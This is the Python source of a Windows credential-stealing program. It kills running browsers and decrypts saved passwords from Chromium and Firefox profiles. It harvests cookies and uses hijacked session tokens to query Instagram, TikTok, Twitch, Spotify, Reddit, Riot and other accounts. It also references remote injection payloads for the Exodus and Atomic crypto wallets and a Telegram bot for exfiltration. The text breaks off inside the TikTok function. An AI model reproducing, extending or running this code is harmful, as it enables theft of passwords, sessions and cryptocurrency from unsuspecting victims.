import ctypes
import asyncio
import base64
import random
import re
import sqlite3
import string
import subprocess
import sys
import winreg
import os
import shutil
import requests
import platform
import winreg
import json
import hmac
import zipfile
import xml.etree.ElementTree as ET
import aiohttp, psutil, win32api # type: ignore

from typing import List
from pathlib import Path
from ctypes import *
from datetime import datetime, time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes # type: ignore
from cryptography.hazmat.backends import default_backend # type: ignore
from Crypto.Cipher import DES3, AES # type: ignore
from base64 import b64decode
from hashlib import sha1, pbkdf2_hmac
from pyasn1.codec.der.decoder import decode # type: ignore

TOKEN = "%TOKEN%"
CHAT_ID = "%CHAT_ID%"

atomic_injection_url = "https://www.dropbox.com/scl/fi/xtt2n593d5n4svefktjhy/atomic.asar?rlkey=5refutaevle4aapp0p6hgn7q1&st=xthb3wxt&dl=1"
exodus_injection_url = "https://www.dropbox.com/scl/fi/3clo0b3x6nfajqm27kvx6/exodus.asar?rlkey=200tiyus0rc0u3u4j9kf517l0&st=d3gcvfd5&dl=1"
mullvad_injection_url = "NotWorking"

def logs_handler(error_message: str) -> None:
    temp_dir = os.path.join(os.getenv('TEMP'), platform.node())
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)
    with open(os.path.join(temp_dir, 'console_logs.txt'), 'a', encoding="utf-8", errors="ignore") as file:
        file.write(f"{error_message}\n")
        
class ListFonction:
    ClipBoard = list()
    AntiViruses = list()
    Network = list()
    WifiInfo = list()
    FileSystemInfo = list()
    SystemInfo = list()
    RdpSession = list()
    ApplicationsInfo = list()
    DiscordAccounts = list()
    FacebookAccounts = list()
    RobloxAccounts = list()
    TikTokAccounts = list()
    TwitterAccounts = list()
    InstagramAccounts = list()
    RiotUserAccounts = list()
    SteamUserAccounts = list()
    RedditAccounts = list()
    TwitchAccounts = list()
    SpotifyAccount = list()
    GuildedAccounts = list()
    StakeAccount = list()
    PatreonAccounts = list()
    MinecraftAccount = list()

class WindowsApi:
    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes, optional_entropy: str= None) -> bytes: 
        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]
        
        pDataIn = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pDataOut = DATA_BLOB()
        pOptionalEntropy = None
        if optional_entropy is not None:
            optional_entropy = optional_entropy.encode("utf-16")
            pOptionalEntropy = DATA_BLOB(len(optional_entropy), ctypes.cast(optional_entropy, ctypes.POINTER(ctypes.c_ubyte)))
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, ctypes.byref(pOptionalEntropy) if pOptionalEntropy is not None else None, None, None, 0, ctypes.byref(pDataOut)):
            data = (ctypes.c_ubyte * pDataOut.cbData)()
            ctypes.memmove(data, pDataOut.pbData, pDataOut.cbData)
            ctypes.windll.Kernel32.LocalFree(pDataOut.pbData)
            return bytes(data)
        raise ValueError("Invalid encrypted_data provided!")

    @staticmethod
    def GetKey(FilePath:str) -> bytes:
        with open(FilePath, "r", encoding="utf-8", errors="ignore") as file:
            jsonContent: dict = json.load(file)
            encryptedKey: str = jsonContent["os_crypt"]["encrypted_key"]
            encryptedKey = base64.b64decode(encryptedKey.encode())[5:]
            return WindowsApi.CryptUnprotectData(encryptedKey)

    @staticmethod
    def Decrpytion(EncrypedValue: bytes, EncryptedKey: bytes) -> str:
        try:
            version = EncrypedValue.decode(errors="ignore")
            if version.startswith("v10") or version.startswith("v11"):
                iv = EncrypedValue[3:15]
                password = EncrypedValue[15:]
                authentication_tag = password[-16:]
                password = password[:-16]
                backend = default_backend()
                cipher = Cipher(algorithms.AES(EncryptedKey), modes.GCM(iv, authentication_tag), backend=backend)
                decryptor = cipher.decryptor()
                decrypted_password = decryptor.update(password) + decryptor.finalize()
                return decrypted_password.decode('utf-8')
            else:
                return str(WindowsApi.CryptUnprotectData(EncrypedValue))
        except:
            return "Decryption Error!, Data cant be decrypt"

class GeckoDecryptionApi:
    def decrypt_aes(self, decoded_item, master_password, global_salt):
        entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
        iteration_count = int(decoded_item[0][0][1][0][1][1])
        key_length = int(decoded_item[0][0][1][0][1][2])
        assert key_length == 32

        encoded_password = sha1(global_salt + master_password.encode('utf-8')).digest()
        key = pbkdf2_hmac(
            'sha256', encoded_password,
            entry_salt, iteration_count, dklen=key_length)

        init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
        encrypted_value = decoded_item[0][1].asOctets()
        cipher = AES.new(key, AES.MODE_CBC, init_vector)
        return cipher.decrypt(encrypted_value)

    def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
        hp = sha1(globalSalt + masterPassword.encode()).digest()
        pes = entrySalt + b"\x00" * (20 - len(entrySalt))
        chp = sha1(hp + entrySalt).digest()
        k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
        tk = hmac.new(chp, pes, sha1).digest()
        k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
        k = k1 + k2
        iv = k[-8:]
        key = k[:24]
        return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

    def getKey(self, directory: Path, masterPassword=""):
        dbfile: Path = directory + "\\key4.db"
        conn = sqlite3.connect(dbfile)
        c = conn.cursor()
        c.execute("SELECT item1, item2 FROM metadata;")
        row = next(c)
        globalSalt, item2 = row

        try:
            decodedItem2, _ = decode(item2)
            encryption_method = '3DES'
            entrySalt = decodedItem2[0][1][0].asOctets()
            cipherT = decodedItem2[1].asOctets()
        except AttributeError:
            encryption_method = 'AES'
            decodedItem2 = decode(item2)
        c.execute("SELECT a11, a102 FROM nssPrivate WHERE a102 = ?;", (b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01",))
        try:
            row = next(c)
            a11, a102 = row  
        except StopIteration:
            raise Exception("gecko database broken")  
        if encryption_method == 'AES':
            decodedA11 = decode(a11)
            key = self.decrypt_aes(decodedA11, masterPassword, globalSalt)
        elif encryption_method == '3DES':
            decodedA11, _ = decode(a11)
            oid = decodedA11[0][0].asTuple()
            assert oid == (1, 2, 840, 113_549, 1, 12, 5, 1, 3), f"idk key to format {oid}"
            entrySalt = decodedA11[0][1][0].asOctets()
            cipherT = decodedA11[1].asOctets()
            key = self.decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)

        return key[:24]

    def PKCS7unpad(self, b):
        return b[: -b[-1]]

    def decodeLoginData(self, key, data):
        asn1data, _ = decode(b64decode(data))
        assert asn1data[0].asOctets() == b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
        assert asn1data[1][0].asTuple() == (1, 2, 840, 113_549, 3, 7)
        iv = asn1data[1][1].asOctets()
        ciphertext = asn1data[2].asOctets()
        des = DES3.new(key, DES3.MODE_CBC, iv)
        return self.PKCS7unpad(des.decrypt(ciphertext)).decode()

class get_data:
    def __init__(self):
        self.profiles_full_path = []
        self.appdata = os.getenv('APPDATA')
        self.localappdata = os.getenv('LOCALAPPDATA')
        self.temp = os.getenv('TEMP')
        self.user_home = os.path.expanduser('~')

        self.browser_paths = {
            "Chromium": os.path.join(self.localappdata, "Chromium", "User Data"),
            "Thorium": os.path.join(self.localappdata, "Thorium", "User Data"),
            "Chrome": os.path.join(self.localappdata, "Google", "Chrome", "User Data"),
            "Chrome (x86)": os.path.join(self.localappdata, "Google(x86)", "Chrome", "User Data"),
            "Chrome SxS": os.path.join(self.localappdata, "Google", "Chrome SxS", "User Data"),
            "Maple": os.path.join(self.localappdata, "MapleStudio", "ChromePlus", "User Data"),
            "Iridium": os.path.join(self.localappdata, "Iridium", "User Data"),
            "7Star": os.path.join(self.localappdata, "7Star", "7Star", "User Data"),
            "CentBrowser": os.path.join(self.localappdata, "CentBrowser", "User Data"),
            "Chedot": os.path.join(self.localappdata, "Chedot", "User Data"),
            "Vivaldi": os.path.join(self.localappdata, "Vivaldi", "User Data"),
            "Kometa": os.path.join(self.localappdata, "Kometa", "User Data"),
            "Elements": os.path.join(self.localappdata, "Elements Browser", "User Data"),
            "Epic Privacy Browser": os.path.join(self.localappdata, "Epic Privacy Browser", "User Data"),
            "Uran": os.path.join(self.localappdata, "uCozMedia", "Uran", "User Data"),
            "Fenrir": os.path.join(self.localappdata, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"),
            "Catalina": os.path.join(self.localappdata, "CatalinaGroup", "Citrio", "User Data"),
            "Coowon": os.path.join(self.localappdata, "Coowon", "Coowon", "User Data"),
            "Liebao": os.path.join(self.localappdata, "liebao", "User Data"),
            "QIP Surf": os.path.join(self.localappdata, "QIP Surf", "User Data"),
            "Orbitum": os.path.join(self.localappdata, "Orbitum", "User Data"),
            "Dragon": os.path.join(self.localappdata, "Comodo", "Dragon", "User Data"),
            "360Browser": os.path.join(self.localappdata, "360Browser", "Browser", "User Data"),
            "Maxthon": os.path.join(self.localappdata, "Maxthon3", "User Data"),
            "K-Melon": os.path.join(self.localappdata, "K-Melon", "User Data"),
            "CocCoc": os.path.join(self.localappdata, "CocCoc", "Browser", "User Data"),
            "Brave": os.path.join(self.localappdata, "BraveSoftware", "Brave-Browser", "User Data"),
            "Amigo": os.path.join(self.localappdata, "Amigo", "User Data"),
            "Torch": os.path.join(self.localappdata, "Torch", "User Data"),
            "Sputnik": os.path.join(self.localappdata, "Sputnik", "Sputnik", "User Data"),
            "Edge": os.path.join(self.localappdata, "Microsoft", "Edge", "User Data"),
            "DCBrowser": os.path.join(self.localappdata, "DCBrowser", "User Data"),
            "Yandex": os.path.join(self.localappdata, "Yandex", "YandexBrowser", "User Data"),
            "UR Browser": os.path.join(self.localappdata, "UR Browser", "User Data"),
            "Slimjet": os.path.join(self.localappdata, "Slimjet", "User Data"),
            "Opera": os.path.join(self.appdata, "Opera Software", "Opera Stable"),
            "OperaGX": os.path.join(self.appdata, "Opera Software", "Opera GX Stable"),
        }

        self.GeckoBrowsers = {
            "Firefox": os.path.join(self.appdata, "Mozilla", "Firefox", "Profiles"),
            "SeaMonkey": os.path.join(self.appdata, "Mozilla", "SeaMonkey", "Profiles"),
            "Mullvad": os.path.join(self.appdata, "Mullvad", "MullvadBrowser", "Profiles"),
            "IceCat": os.path.join(self.appdata, "Mozilla", "icecat", "Profiles"),
            "Pale Moon": os.path.join(self.appdata, "Moonchild Productions", "Pale Moon", "Profiles"),
            "Waterfox": os.path.join(self.appdata, "Waterfox", "Profiles"),
            "Postbox": os.path.join(self.appdata, "Postbox", "Profiles"),
            "Thunderbird": os.path.join(self.appdata, "Thunderbird", "Profiles"),
            "Flock": os.path.join(self.appdata, "Flock", "Browser", "Profiles"),
        }

        self.GeckoFilesFullPath = list()
        self.GeckoCookieList = list()
        self.GeckoHistoryList = list()
        self.GeckoAutofiList = list()
        self.GeckoPasswordsList = list()

    async def RunAllFonctions(self):
        await self.kill_browsers()
        await self.ListGeckoProfiles()

        taskk = [
            asyncio.create_task(self.GetGeckoAutoFills()),
            asyncio.create_task(self.GetGeckoLogins()),
            asyncio.create_task(self.GetGeckoCookies()),
            asyncio.create_task(self.GetGeckoHistorys()),
            asyncio.create_task(self.StealSteamUser()), 
            asyncio.create_task(self.StealDiscord()),
            InfoStealer().run_all_fonctions(),
        ]

        await asyncio.gather(*taskk)
        await self.InsideFolder()
        await self.SendAllData()

    async def kill_browsers(self):
        try:
            process_names = ["firefox.exe", "seamonkey.exe", "mullvadbrowser.exe", "icecat.exe", "palemoon.exe", "chromium.exe", "thorium.exe", "chrome.exe", "maple.exe", "iridium.exe", "7star.exe", "centbrowser.exe", "chedot.exe", "vivaldi.exe", "kometa.exe", "elements.exe", "epic.exe", "uran.exe", "sleipnir.exe", "citrio.exe", "coowon.exe", "liebao.exe",  "qipsurf.exe", "orbitum.exe", "dragon.exe", "360browser.exe", "maxthon.exe", "kmeleon.exe", "coccoc.exe", "brave.exe", "amigo.exe", "torch.exe", "sputnik.exe", "msedge.exe", "dcbrowser.exe", "yandex.exe", "urbrowser.exe", "slimjet.exe", "opera.exe", "operagx.exe",]
            process = await asyncio.create_subprocess_shell('tasklist',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)

            stdout, stderr = await process.communicate()
            if not process.returncode != 0:
                output_lines = stdout.decode(errors="ignore").split('\n')
                for line in output_lines:
                    for process_name in process_names:
                        if process_name.lower() in line.lower():
                            parts = line.split()
                            pid = parts[1]
                            process = await asyncio.create_subprocess_shell(f'taskkill /F /PID {pid}',stdout=asyncio.subprocess.PIPE,stderr=asyncio.subprocess.PIPE)
                            await process.communicate()
        except Exception as Error:
            logs_handler(f"[ERROR] - killing browser processes: {str(Error)}")
            pass

    async def ListGeckoProfiles(self) -> None:
        try:
            for browser_name, directory in self.GeckoBrowsers.items():
                if os.path.isdir(directory):
                    for root, dirs, files in os.walk(directory):
                        for file in files:
                            if file.endswith(("cookies.sqlite", "places.sqlite", "formhistory.sqlite")):
                                file_path = os.path.join(root, file)
                                self.GeckoFilesFullPath.append(file_path)
    
        except Exception as Error:
            logs_handler(f"[ERROR] - getting gecko profiles: {str(Error)}")

    async def GetGeckoProfiles(self) -> None:
        try:
            profiles_path = os.path.join(self.GeckoFilesFullPath, "profiles.ini")
            with open(profiles_path, "r") as f:
                data = f.read()
            profiles = [
                os.path.join(self.GeckoFilesFullPath.encode("utf-8"), p.strip()[5:].encode("utf-8")).decode("utf-8")
                for p in re.findall(r"^Path=.+(?s:.)$", data, re.M)
            ]
        except Exception:
            profiles = []

        return profiles

    async def GetGeckoLogins(self) -> None:
        try:
            Profiles = await self.GetGeckoProfiles()
            with open(os.path.join(Profiles, "logins.json"), "r", encoding="utf-8", errors="ignore") as f:
                json_logins = json.load(f)
                for row in json_logins.get("logins", []):
                    host, enc_user, enc_pass = row["hostname"], row["encryptedUsername"], row["encryptedPassword"]
                    key = GeckoDecryptionApi.getKey(Path(Profiles))
                    username = GeckoDecryptionApi.decodeLoginData(key, enc_user)
                    password = GeckoDecryptionApi.decodeLoginData(key, enc_pass)
                    if username and password:
                        self.GeckoPasswordsList.append(f"URL: {host}\nUsername: {username}\nPassword: {password}\nApp: Mozilla\nProfile: {Profiles}\n")
        except Exception as Error:
            logs_handler(f"Error reading gecko password login data: {str(Error)}")
            pass

    async def GetGeckoCookies(self) -> None:
        try:
            for files in self.GeckoFilesFullPath:
                if "cookie" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                    twitch_username = None
                    twitch_cookie = None
                    cookies = cursor.fetchall()
                    for cookie in cookies:
                        self.GeckoCookieList.append(f"{cookie[0]}\t{'FALSE' if cookie[4] == 0 else 'TRUE'}\t{cookie[2]}\t{'FALSE' if cookie[0].startswith('.') else 'TRUE'}\t{cookie[4]}\t{cookie[1]}\t{cookie[3]}\n")
                        if "instagram" in str(cookie[0]).lower() and "sessionid" in str(cookie[1]).lower():
                            asyncio.create_task(self.StealInstagram(cookie[3], "Mozilla"))
                        if ".tiktok.com" in str(cookie[0]).lower() and str(cookie[1]) == "sessionid":
                            asyncio.create_task(self.StealTikTok(cookie[3], "Mozilla"))
                        if ".mullvad.net" in str (cookie[0]).lower() and str (cookie[1]) == "accessToken":
                            asyncio.create_task(self.StealMullvadVPN(cookie[3], "Mozilla"))
                        if ".x.com" in str(cookie[0]).lower() and str(cookie[1]) == "auth_token":
                            asyncio.create_task(self.StealTwitter(cookie[3], "Mozilla"))
                        if ".reddit.com" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                            asyncio.create_task(self.StealReddit(cookie[3], "Mozilla"))
                        if ".spotify.com" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
                            asyncio.create_task(self.StealSpotify(cookie[3], "Mozilla"))
                        if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                            asyncio.create_task(self.StealRoblox(cookie[3], "Mozilla"))
                        if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                            twitch_cookie = cookie[3]
                        if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
                            twitch_username = cookie[3]
                        if not twitch_username == None and not twitch_cookie == None:
                            asyncio.create_task(self.StealTwitch(twitch_cookie, twitch_username, "Mozilla"))
                            twitch_username = None
                            twitch_cookie = None
                        if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
                            asyncio.create_task(self.StealRiotUser(cookie[3], "Mozilla"))
                        if ".facebook.com" in str(cookie[0]):
                            asyncio.create_task(self.StealFacebook(cookie[3], "Mozilla"))
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Mozilla cookies - {str(Error)}")
        else:
            pass

    async def GetGeckoHistorys(self) -> None:
        try:
            for files in self.GeckoFilesFullPath:
                if "places" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                    historys = cursor.fetchall()
                    for history in historys:
                        self.GeckoHistoryList.append(f"ID: {history[0]}\nURL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Mozilla historys - {str(Error)}")
        else:
            pass

    async def GetGeckoAutoFills(self) -> None:
        try:
            for files in self.GeckoFilesFullPath:
                if "formhistory" in files:
                    database_connection = sqlite3.connect(files)
                    cursor = database_connection.cursor()
                    cursor.execute("select * from moz_formhistory")
                    autofills = cursor.fetchall()
                    for autofill in autofills:
                        self.GeckoAutofiList.append(f"{autofill[0]} = {autofill[1]}\n")
        except Exception as Error:
            logs_handler(f"[ERROR] - getting Mozilla autofills - {str(Error)}")
        else:
            pass

    async def StealRiotUser(self, cookie, browser: str) -> None:
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
                    response = await req.json()

            username = str(response.get("username", "No Username"))
            email = str(response.get("email", "No Email"))
            region = str(response.get("region", "No Region"))
            locale = str(response.get("locale", "No Locale"))
            country = str(response.get("country", "No Country"))
            mfa = str(response.get("mfa", {}).get("verified", "No MFA Info"))

        except Exception as e:
            logs_handler(f"riot user error - {str(e)}")
        else:
            ListFonction.RiotGames.append(f"Username: {username}\nEmail: {email}\nRegion: {region}\nLocale: {locale}\nCountry: {country}\nMFA Verified: {mfa}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

    async def StealTwitch(self, auth_token, username, browser:str) -> None:
        try:
            url = 'https://gql.twitch.tv/gql'
            headers = {
                'Authorization': f'OAuth {auth_token}',
            }

            query = f"""
            query {{
                user(login: "{username}") {{
                    id
                    login
                    displayName
                    email
                    hasPrime
                    isPartner
                    language
                    profileImageURL(width: 300)
                    bitsBalance
                    followers {{
                        totalCount
                    }}
                }}
            }}"""

            data = {
                "query": query
            }

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.post(url, headers=headers, json=data) as response:
                    if response.status == 200:
                        data = await response.json()

            idd = data["data"]["user"]["id"]
            login = data["data"]["user"]["login"]
            acc_url = f"https://www.twitch.tv/{login}"
            displayName = data["data"]["user"]["displayName"]
            email = data["data"]["user"]["email"]
            hasPrime = data["data"]["user"]["hasPrime"]
            isPartner = data["data"]["user"]["isPartner"]
            lang = data["data"]["user"]["language"]
            bits = data["data"]["user"]["bitsBalance"]
            followers = data["data"]["user"]["followers"]["totalCount"]            

        except Exception as e:
            logs_handler(f"twitch session error - {str(e)}")
        else:
            ListFonction.TwitchAccounts.append(f"ID: {idd}\nLogin: {login}\nDisplay Name: {displayName}\nEmail: {email}\nHas Prime: {hasPrime}\nIs Partner: {isPartner}\nLanguage: {lang}\nBits Balance: {bits}\nFollowers: {followers}\nProfile URL: {acc_url}\nBrowser: {browser}\nAuth Token: {auth_token}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

    async def StealSpotify(self, cookie, browser: str) -> None:
        try:
            url = 'https://www.spotify.com/api/account-settings/v1/profile'
            url2 = 'https://www.spotify.com/eg-en/api/account/v1/datalayer/'

            headers = {
                'cookie': f'sp_dc={cookie}',
                'Accept': 'application/json'
            }

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(url, headers=headers) as response:
                    if response.status == 200:
                        data = await response.json()
                    else:
                        pass

                async with session.get(url2, headers=headers) as response:
                    if response.status == 200:
                        data2 = await response.json()
                    else:
                        pass

            email = data["profile"]["email"]
            gender = data["profile"]["gender"]
            birthdate = data["profile"]["birthdate"]
            country = data["profile"]["country"]
            third = data["profile"]["third_party_email"]
            username = data["profile"]["username"]
            istrial = data2["isTrialUser"]
            plan = data2["currentPlan"]
            isrecurring = data2["isRecurring"]
            daysleft = data2["daysLeft"]
            sub = data2["isSubAccount"]
            billing = data2["nextBillingInfo"]
            expiry = data2["expiry"]

            ListFonction.SpotifyAccount.append(f"Browser: {browser}\nEmail: {email}\nGender: {gender}\nBirthdate: {birthdate}\nCountry: {country}\nThird Party Email: {third}\nUsername: {username}\nIsTrial: {istrial}\nCurrentPlan: {plan}\nIsRecurring: {isrecurring}\nDaysLeft: {daysleft}\nIsSub: {sub}\nBilling Info: {billing}\nExpiry: {expiry}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

        except Exception as e:
            logs_handler(f"spotify session error - {str(e)}")


    async def StealReddit(self, cookie, browser: str) -> None:
        try:
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.post('https://accounts.reddit.com/api/access_token', headers={"cookie": f"reddit_session={cookie}", "Authorization": "Basic b2hYcG9xclpZdWIxa2c6"}, json={"scopes": ["*", "email", "pii"]}) as res:
                    response = await res.json()
                    accessToken = response["access_token"]
                async with session.get('https://oauth.reddit.com/api/v1/me', headers={'User-Agent': 'android:com.example.myredditapp:v1.2.3', "Authorization": "Bearer " + accessToken}) as req:
                    data2 = await req.json()

                gmail = data2.get("email", "No email") if data2.get("email") else "No email"
                username = data2.get("name", "No username")
                profileUrl = f'https://www.reddit.com/user/{username}'
                commentKarma = data2.get("comment_karma", "No comment karma")
                totalKarma = data2.get("total_karma", "No total karma")
                coins = data2.get("coins", "No coins")
                mod = data2.get("is_mod", "No mod status")
                gold = data2.get("is_gold", "No gold status")
                suspended = data2.get("is_suspended", "No suspension status")

        except Exception as e:
            logs_handler(f"reddit session error - {str(e)}")
        else:
            ListFonction.RedditAccounts.append(f"Username: {username}\nEmail: {gmail}\nProfile URL: {profileUrl}\nComment Karma: {commentKarma}\nTotal Karma: {totalKarma}\nCoins: {coins}\nMod Status: {mod}\nGold Status: {gold}\nSuspended: {suspended}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")


    async def StealPatreon(self, cookie, browser: str) -> None:
        try:
            patreonurl = "https://www.patreon.com/api/current_user?include=connected_socials%2Ccampaign.connected_socials&json-api-version=1.0"
            headers = {
                "Cookie": f'session_id={cookie}',
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            }

            async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(patreonurl) as response:
                    data = await response.json()

            req = data["data"]["attributes"].get
            social_connections = data.get("data", {}).get("attributes", {}).get("social_connections", {})
            created = req("created", "Couldn't get creation date")
            email = req("email", "Couldn't get email")
            verified = 'True' if req("is_email_verified", False) else 'False'
            currency = req("patron_currency", "Couldn't get currency")
            bio = req("about", "Couldn't get bio/No bio")
            non_null_social_connections = [key for key, value in social_connections.items() if value is not None]
            url = data["links"].get("self", "Couldn't get URL")
            url2 = req("url", "Couldn't get URL")
            social_connection_names = "\n".join([f"{key.capitalize()}" for key in non_null_social_connections]) if non_null_social_connections else "No connections"

        except Exception as e: 
            logs_handler(f"patreon session error - {str(e)}")
        else:
            ListFonction.PatreonAccounts.append(f"Email: {email}\nVerified: {verified}\nCreated: {created}\nCurrency: {currency}\nBio: {bio}\nSocial Connections:\n{social_connection_names}\nProfile URL: {url}\nAdditional URL: {url2}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

    async def StealGuilded(self, cookie, browser: str) -> None:
        try:
            urlguild = "https://www.guilded.gg/api/me"
            headersguild = {
                "Cookie": f"hmac_signed_session={cookie}",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            }

            async with aiohttp.ClientSession(headers=headersguild, connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(urlguild) as response:
                    data = await response.json()

            social_links_info = [{"Name": link.get('handle', ''), "Website": link.get('type', 'Cannot get the website'), "URL": link.get('additionalInfo', {}).get('profileUrl', 'No Website')} for link in data["user"].get('socialLinks', [])] or 'No Connections'

            formatted_social_links = "\n".join([f"📙 {link['Name']}\n🌐 {link['Website']}\n`🔗 {link['URL']}`" for link in social_links_info]) if social_links_info != 'No Connections' else 'No Connections'

            email = data["user"].get("email", 'No Email')
            ids = data["user"].get("id", 'Error getting ID')
            globalusername = data["user"].get("name", 'No global username')
            username = data["user"].get("subdomain", 'No Subdomain (Private Username)')
            join = data["user"].get("joinDate", "Couldn't get join date")
            bio = data["user"]["aboutInfo"].get("tagLine", "Couldn't get user bio")

        except Exception as e:
            logs_handler(f"guilded session error - {str(e)}")
        else:
            ListFonction.GuildedAccounts.append(f"Username: {username}\nGlobal Username: {globalusername}\nEmail: {email}\nUser ID: {ids}\nJoin Date: {join}\nBio: {bio}\nSocial Links:\n{formatted_social_links}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")


    async def StealInstagram(self, cookie: str, browser: str) -> None:
        try:
            headers = {
                "user-agent": "Instagram 219.0.0.12.117 Android",
                "cookie": f"sessionid={cookie}"
            }

            infoURL = 'https://i.instagram.com/api/v1/accounts/current_user/?edit=true'

            async with aiohttp.ClientSession(headers=headers, connector=aiohttp.TCPConnector(ssl=True)) as session:
                async with session.get(infoURL) as response:
                    data = await response.json()
                async with session.get(f"https://i.instagram.com/api/v1/users/{data['user']['pk']}/info/") as response:
                    data2 = await response.json()

            username = data["user"]["username"]
            profileURL = "https://instagram.com/" + username

            bio = data["user"]["biography"] if data["user"]["biography"] else "No bio"
            bio = bio.replace("\n", ", ")

            fullname = data["user"]["full_name"] if data["user"]["full_name"] else "No nickname"
            email = data["user"].get("email", "No email")
            verify = data["user"].get("is_verified", False)
            followers = data2["user"].get("follower_count", 0)
            following = data2["user"].get("following_count", 0)

        except Exception as e:
            logs_handler(f"instagram session error - {str(e)}")
        else:
            ListFonction.InstagramAccounts.append(f"Username: {username}\nFull Name: {fullname}\nEmail: {email}\nIs Verified: {'Yes' if verify else 'No'}\nFollowers: {followers}\nFollowing: {following}\nBio: {bio}\nProfile URL: {profileURL}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

    async def StealTikTok(self, cookie: str, browser: str) -> None:
        try:
            headers = {"cookie": f"sessionid={cookie}", "Accept-Encoding": "identity"}
            url1 = 'https://www.tiktok.com/passport/web/account/info/'
            url2 = 'https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988'

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                data = await (await session.get(url1, headers=headers)).json()
                data2 = await (await session.get(url2, headers=headers)).json()

                user_id = data["data"]["user_id"]
                email = data["data"].get("email", "No Email")
                phone = data["data"].get("mobile", "No number")
                username = data["data"]["username"]
                coins = data2["data"]["coins"]
                timestamp = data["data"]["create_time"]
                uid = data["data"]["sec_user_id"]

                try:
                    url3 = f'https://www.tiktok.com/api/user/list/?count=1&minCursor=0&scene=67&secUid={uid}'
                    data3 = await (await session.get(url3, headers=headers)).json()
                    subscriber = data3.get("total", "0")
                except Exception as e:
                    logs_handler(f"get tiktok subs error - {str(e)}")
                    subscriber = "0"

                formatted_date = datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')

